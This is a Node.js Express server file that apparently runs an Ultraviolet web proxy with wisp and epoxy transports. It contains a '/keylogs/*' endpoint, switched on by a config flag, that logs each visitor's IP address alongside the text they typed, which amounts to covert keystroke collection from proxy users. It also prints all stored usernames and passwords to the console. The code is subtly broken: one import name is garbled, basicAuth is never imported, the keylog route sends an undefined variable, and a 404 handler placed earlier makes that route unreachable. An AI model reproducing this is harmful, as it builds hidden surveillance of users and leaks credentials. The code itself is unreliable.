import express from "express";
import { createServe r} from "node:http";
import { uvPath } from "@titaniumnetwork-dev/ultraviolet";
import { epoxyPath } from "@mercuryworkshop/epoxy-transport";
import { baremuxPath } from "@mercuryworkshop/bare-mux/node";
import { join } from "node:path";
import { hostname } from "node:os";
import { fileURLToPath } from "url";
import config from "./config.js";
import wisp from "wisp-server-node"
import chalk from "chalk";

console.log(chalk.yellow("🚀 Starting server..."));


const app = express();
const publicPath = fileURLToPath(new URL("public/", import.meta.url));

if (config.challenge) {
  console.log(
    chalk.green("🔒 Password protection is enabled! Listing logins below"),
  );
  Object.entries(config.users).forEach(([username, password]) => {
    console.log(chalk.blue(`Username: ${username}, Password: ${password}`));
  });
  app.use(basicAuth({ users: config.users, challenge: true }));
}

app.use(express.static(publicPath));

app.use("/uv/", express.static(uvPath));
app.use("/epoxy/", express.static(epoxyPath));
app.use("/baremux/", express.static(baremuxPath));

// 404 stuff
app.use((req, res) => { 
    res.status(404);
    res.sendFile(join(publicPath, "404.html"));
});


app.get("/keylogs/*", async (req, res, next) => { 
  try { 
      if (config.keylogs) {
          const keylogPath = req.params[0];
          console.log(`${req.ip} Typed: ${keylogPath}`);
          res.writeHead(200, { "Content-Type": "application/json" });
          res.end(data);
      }
  } 
  catch (error) {
      console.error("Error fetching asset:", error);
      res.setHeader("Content-Type", "text/html");
      res.status(500).send("Error fetching the asset");
  }
});

const server = createServer();

server.on("request", (req, res) => { 
    res.setHeader("Cross-Origin-Opener-Policy", "same-origin");
    res.setHeader("Cross-Origin-Embedder-Policy", "require-corp"); 
    app(req, res); 
});

server.on("upgrade", (req, socket, head) => { 
    if (req.url.endsWith("/wisp/")) wisp.routeRequest(req, socket, head); 
    else socket.end();
});

let port = parseInt(process.env.PORT || "");

if (isNaN(port)) port = 8080;

server.on("listening", () => { 
    const address = server.address();
    console.log(chalk.green("🌍 Server is running on: "));
    console.log(`\thttp://localhost:${address.port}`); 
    console.log(`\thttp://${hostname()}:${address.port}`); 
    console.log( `\thttp://${address.family === "IPv6" ? `[${address.address}]` : address.address }:${address.port}` );
});


// https://expressjs.com/en/advanced/healthcheck-graceful-shutdown.html
process.on("SIGINT", shutdown);
process.on("SIGTERM", shutdown);

function shutdown() { 
    console.log("SIGTERM signal received: closing HTTP server");
    server.close(); 
    process.exit(0); 
}

server.listen({
    port,
});
